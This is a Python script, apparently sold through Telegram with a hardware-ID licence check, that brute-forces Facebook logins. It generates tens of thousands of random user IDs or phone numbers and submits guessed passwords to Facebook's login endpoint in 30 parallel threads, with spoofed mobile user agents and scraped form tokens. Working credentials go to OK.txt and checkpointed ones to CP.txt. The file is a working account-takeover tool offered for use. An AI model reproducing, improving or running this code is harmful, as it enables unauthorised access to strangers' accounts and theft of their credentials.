#!/usr/bin/python3
#-*-coding:utf-8-*-


P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import platform
import requests
import uuid
import hashlib
import random
import string
import logging
import subprocess
from datetime import datetime, timezone, timedelta

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python techboy237facebook_brute_force4_1b.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop


loop = 0
oks = []
cps = []

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

# Server URLs (Make sure to define these)
SERVER_URL = os.getenv("SERVER_URL", "https://techboy237myserver-de77135ab98f.herokuapp.com")
STATUS_URL = f"{SERVER_URL}/status"
HWID_FILE = os.path.expanduser("~/.hwid")
TELEGRAM_URL = "Techboy237"
TELEGRAM_APP_URL = "tg://resolve?domain=techboy237"
		
def banner():
    os.system("clear")
    print(f"{B}╔══════════════════════════════════════════╗{B}")
    print(f"{B}║{B}  Author   : {M}Techboy237                   {B}║{B}")
    print(f"{B}║{B}  Telegram : {B}https://t.me/AlphaTech237    {B}║{B}")
    print(f"{B}║{B}  Telegram : {B}https://t.me/techboy237      {B}║{B}")
    print(f"{B}║{B}  Version  : {H}4.8B                         {B}║{B}")
    print(f"{B}╚══════════════════════════════════════════╝{B}")
    print(f'     {M}》{H}》{B}》{H}Facebook Brute-force{B}《{H}《{B}《')
    print("")

def linex():
    print("%s════════════════════════════════════════════%s\n" % (Z, N))

banner()

def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def Techboy237():
	os.system('clear')
	banner()
	print(f' {H}[1] RANDOM NUMBER CRACK')
	print(f' {K}[2] RANDOM UID CRACK')
	print(f' {M}[B] BACK\n')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_uid()
	elif opt =='3':
		Techboy237()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def random_uid():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(30000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f' {H}EXAMPLE : 123456,1234567,12345678 {N}\n')
	pwx = input(f' {B}PUT PASS : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

def random_number():
	user=[]
	os.system('clear')
	banner()
	print(f"          {FM}PUT A FULL MOBILE NUMBER{N}\n         {FM}OF ANY COUNTRY AS YOU WISH{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H}+237677XXXX{Z}]\n")
	fkode = input(f'{K} PUT NUMBER : {H}')
	if len(fkode) < 10:
		xox(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(30000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)


def cracker(uid,pwx,tl):
	global loop
	global cps
	global oks
	try:
		for pasw in pwx:
			ses = requests.Session()
			heas = {"Host": "web.beta.facebook.com",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate, br",
				"Referer": "https://web.beta.facebook.com/",
				"Content-Type": "application/x-www-form-urlencoded",
				"Origin": "https://web.beta.facebook.com",
				"Upgrade-Insecure-Requests": "1",
				"Sec-Fetch-Dest": "document",
				"Sec-Fetch-Mode": "navigate",
				"Sec-Fetch-Site": "same-origin",
				"Sec-Fetch-User": "?1",
				"Priority": "u=0, i",
				"Te": "trailers"}
			link = ses.get("https://web.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", headers=heas)
			gett = sop(link.text, "html.parser")
			datax = gett.find("form",{"method":"post"})["action"]
			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"email": uid,
				"pass": pasw,
				"timezone": re.search('name="timezone" value="(.*?)"', str(link.text)).group(1),
				"lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNTEsImMiOjI0fQ%3D%3D",
				"lgnrnd": re.search('name="lgnrnd" value="(.*?)"', str(link.text)).group(1),
				"lgnjs": re.search('name="lgnjs" value="(.*?)"', str(link.text)).group(1),
				"ab_test_data": "",
				"locale": "en_GB",
				"next": "https%3A%2F%2Fweb.beta.facebook.com%2F%3Fskip_api_login%3D1%26api_key%3D322935469656730%26kid_directed_site%3D0%26app_id%3D322935469656730%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D322935469656730%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.meta.com%25252Flogin%25252Ffacebook%25252Fresponse%25252F%25253Fstate%25253DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%2526response_type%253Dcode%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_birthday%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Ddb916fd5-9b2a-4601-ac5f-1d7251343150%2526tp%253Dunspecified%26cancel_url%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dtouch%26locale%3Den_GB%26pl_dbl%3D0%26refsrc%3Ddeprecated",
				"login_source": "login_bluebar",
				"guid": "",
				"prefill_contact_point": "",
				"prefill_source": "",
				"prefill_typ": ""}
			cookie = dict(ses.cookies.get_dict())
			head = {"Host": "web.beta.facebook.com",
				"User-Agent": str(random.choice([
    f"Mozilla/5.0 (Linux; Android {str(random.randint(8,15))}; SM-{random.choice(['J', 'A', 'M'])}{str(random.randint(100,999))}{random.choice(['F', 'G', 'H'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(110,120))}.0.{str(random.randint(3000,5000))}.0 Mobile Safari/537.36",
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,18)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(16,18)}.0 Mobile/15E148 Safari/604.1",
    f"Mozilla/5.0 (Linux; U; Android {str(random.randint(10,15))}; en-us; Redmi {random.randint(9,13)} Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(115,120))}.0.{str(random.randint(3000,5000))}.0 Mobile Safari/537.36",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,15)}; Pixel {random.randint(5,9)} Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(115,120)}.0.{random.randint(3000,5000)}.0 Mobile Safari/537.36",
    f"Mozilla/5.0 (Linux; Android {random.randint(10,15)}; Samsung Galaxy S{random.randint(20,24)} Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(115,120)}.0.{random.randint(3000,5000)}.0 Mobile Safari/537.36"
])),
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate, br",
				"Referer": "https://web.beta.facebook.com/?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddb916fd5-9b2a-4601-ac5f-1d7251343150%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr",
				"Content-Type": "application/x-www-form-urlencoded",
				"Origin": "https://web.beta.facebook.com",
				"Upgrade-Insecure-Requests": "1",
				"Sec-Fetch-Dest": "document",
				"Sec-Fetch-Mode": "navigate",
				"Sec-Fetch-Site": "same-origin",
				"Sec-Fetch-User": "?1",
				"Priority": "u=0, i",
				"Te": "trailers"}
			xnxx = ses.post(f"https://web.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
			fb_cookies=ses.cookies.get_dict().keys()
			if 'c_user' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = [item.split('=')[1] for item in coki.split(';') if item.startswith('c_user=')][0]
				print('\033[1;32m [TECH-OK] '+uidx+'|'+pasw+'\033[0;97m')
				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
				oks.append(uidx)
				break
			elif 'checkpoint' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = [item.split('=')[1] for item in coki.split(';') if item.startswith('c_user=')][0]
				print('\033[1;31m [TECH-CP] '+uidx+' | '+pasw+'\033[0;97m')
				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
				cps.append(uidx)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()
	except:
		pass

# Setup logging
logging.basicConfig(filename=os.path.expanduser("~/.hwid_errors.log"), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def get_linux_hwid():
    """Retrieve HWID for Linux systems."""
    try:
        hwid = subprocess.check_output('cat /var/lib/dbus/machine-id', shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not hwid:
            raise ValueError("HWID is empty.")
        return hwid
    except Exception as e:
        logging.error(f"Error getting Linux HWID: {e}")
        return str(uuid.uuid4())

def get_termux_hwid():
    """Retrieve HWID for Termux environments."""
    try:
        hwid = subprocess.check_output('termux-telephony-deviceinfo', shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not hwid:
            raise ValueError("HWID is empty.")
        return hwid
    except Exception as e:
        logging.error(f"Error getting Termux HWID: {e}")
        return str(uuid.uuid4())

def is_termux():
    """Check if the environment is Termux."""
    return os.path.exists("/data/data/com.termux/files/usr/bin/termux-telephony-deviceinfo")

def generate_unique_string(hwid):
    """Generate a unique string based on HWID."""
    random.seed(hwid)
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def get_hwid():
    """Generate or retrieve a hardware ID (HWID). Ensure it's saved only if not already present and has the 'FB8BH' prefix."""
    # Read the existing HWID if it exists
    existing_hwid = None
    if os.path.exists(HWID_FILE):
        try:
            with open(HWID_FILE, 'r') as file:
                existing_hwid = file.read().strip()
                if existing_hwid.startswith("FB8BH"):
                    return existing_hwid  # Return existing HWID if it already has the "FB8BH" prefix
        except IOError as e:
            logging.error(f"Error reading HWID file: {e}")

    # Generate a new HWID if not already saved
    if platform.system() == "Linux":
        hwid = get_termux_hwid() if is_termux() else get_linux_hwid()
    elif platform.system() == "Android":
        hwid = get_termux_hwid()
    else:
        raise SystemExit("Unsupported platform.")

    unique_string = generate_unique_string(hwid)
    hashed_hwid = hashlib.sha256(hwid.encode()).hexdigest()
    combined_hwid = f"FB8BH{hashed_hwid}{unique_string}"

    # Save the newly generated HWID only if it doesn't exist or is invalid
    try:
        if existing_hwid is None or not existing_hwid.startswith("FB8BH"):
            with open(HWID_FILE, 'w') as file:
                file.write(combined_hwid)
            logging.info(f"Generated and saved new HWID: {combined_hwid}")
        else:
            logging.info("Existing HWID already has the 'FB8BH' prefix. No update required.")
    except IOError as e:
        logging.error(f"Error writing HWID file: {e}")

    return combined_hwid

def open_telegram():
    # Function to open Telegram
    os.system("xdg-open https://t.me/Techboy237")

def parse_remaining_time(remaining_time_str):
    """Parse the remaining time string into a timedelta object."""
    if remaining_time_str == "Expired":
        return timedelta()  # Represents expired time

    try:
        days, time_str = remaining_time_str.split(' days, ') if ' days, ' in remaining_time_str else ('0', remaining_time_str)
        hours, minutes, seconds_micro = time_str.split(':')
        seconds, microseconds = seconds_micro.split('.') if '.' in seconds_micro else (seconds_micro, '0')

        return timedelta(days=int(days), hours=int(hours), minutes=int(minutes), seconds=int(seconds), microseconds=int(microseconds))
    except (ValueError, IndexError) as e:
        logging.error(f"Error parsing remaining time: {e}")
        return timedelta()

def format_duration(duration):
    """Format the duration as days:hours:minutes:seconds.microseconds."""
    days = duration.days
    hours, remainder = divmod(duration.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}:{hours:02}:{minutes:02}:{seconds:02}"

def verify_device(hwid):
    """Verify the device with the server and get remaining time."""
    try:
        logging.debug(f"Generated HWID: {hwid}")
        response = requests.post(f"{SERVER_URL}/verify_device", json={"hwid": hwid})
        logging.debug(f"Verification response status: {response.status_code}")

        if response.status_code == 200:
            handle_verification_success(response, hwid)
        elif response.status_code == 403:
            handle_access_expired(hwid)
        elif response.status_code == 404:
            handle_access_not_granted(hwid)
        else:
            handle_general_error(hwid)
    except requests.RequestException as e:
        logging.error(f"Network error occurred: {e}")
        print("Network error :👉👉Please Check Your Network Connection.")

def handle_verification_success(response, hwid):
    """Handle successful device verification."""
    response_content = response.json()
    logging.debug(f"Verification response content: {response_content}")

    if "ERROR" in response_content.get("message", ""):
        handle_error_message(response_content, hwid)
    else:
        retrieve_status(hwid)

def handle_error_message(response_content, hwid):
    """Handle error messages returned by the server."""
    error_message = response_content.get("message")
    if "not found" in error_message:
        print(f"🔑Access not granted🔑: HWID: {hwid}")
        open_telegram()
    else:
        print(f"Error: {error_message}")

def retrieve_status(hwid):
    """Retrieve the status of the HWID from the server."""
    remaining_response = requests.get(STATUS_URL)
    logging.debug(f"Status request response: {remaining_response.status_code}")

    if remaining_response.status_code == 200:
        handle_status_response(remaining_response, hwid)
    else:
        logging.error(f"Status request failed with status code: {remaining_response.status_code}")
        print("✅Access granted✅ Could not retrieve status from the server.")

def handle_status_response(remaining_response, hwid):
    """Handle the status response to determine access validity."""
    response_content = remaining_response.json()
    logging.debug(f"Status response content: {response_content}")

    if isinstance(response_content, list):
        hwid_status = next((status for status in response_content if status.get("hwid") == hwid), None)

        if hwid_status:
            process_hwid_status(hwid_status, hwid)
        else:
            logging.error(f"No matching HWID found in the response: {hwid}")
            print("✅Access granted✅: Could not retrieve remaining time.")
    else:
        logging.error(f"Invalid or empty response: {response_content}")
        print("✅Access granted✅: Could not retrieve remaining time.")

def process_hwid_status(hwid_status, hwid):
    """Process the HWID status and determine if access is granted or expired."""
    expires_at_str = hwid_status.get("expires_at")
    remaining_time_str = hwid_status.get("remaining_time", "0:00:00")


    try:
        expiration_time = datetime.fromisoformat(expires_at_str).astimezone(timezone.utc)
        remaining_duration = parse_remaining_time(remaining_time_str)
        current_time = datetime.now(timezone.utc)

        if expiration_time <= current_time:
            handle_access_expired(hwid)
        else:
            remaining_duration_str = format_duration(remaining_duration)
            print(f"✅Access granted✅: 🕔Time duration: {remaining_duration_str}")
            Techboy237()  # Call Techboy237() 
            return True
    except Exception as e:
        logging.error(f"Error parsing duration or expiration time: {e}")
        print("✅Access granted✅: 🕔Time duration: {remaining_duration_str}")
        Techboy237()  # Call Techboy237() 
        return True

def handle_access_expired(hwid):
    """Handle cases where access has expired."""
    print(f"🔐Access expired🔐: HWID: {hwid} :👉👉 Please contact {TELEGRAM_URL} to buy an Access with your HWID.")
    open_telegram()

def handle_access_not_granted(hwid):
    """Handle cases where access is not granted."""
    print(f"🔑Access not granted🔑: HWID: {hwid} :👉👉 Please contact {TELEGRAM_URL} to buy an Access with your HWID.")
    open_telegram()

def handle_general_error(hwid):
    """Handle general errors that are not specifically covered."""
    logging.error(f"General error encountered with HWID: {hwid}")
    print(f"❌ Error: An unknown error occurred for HWID: {hwid}. Please contact support.")


def main():
    """Main function to execute the script."""
    hwid = get_hwid()
    if verify_device(hwid):
        Techboy237()  # Call Techboy237() only if access is granted

if __name__ == '__main__':
    main()  # Correctly call main()
    
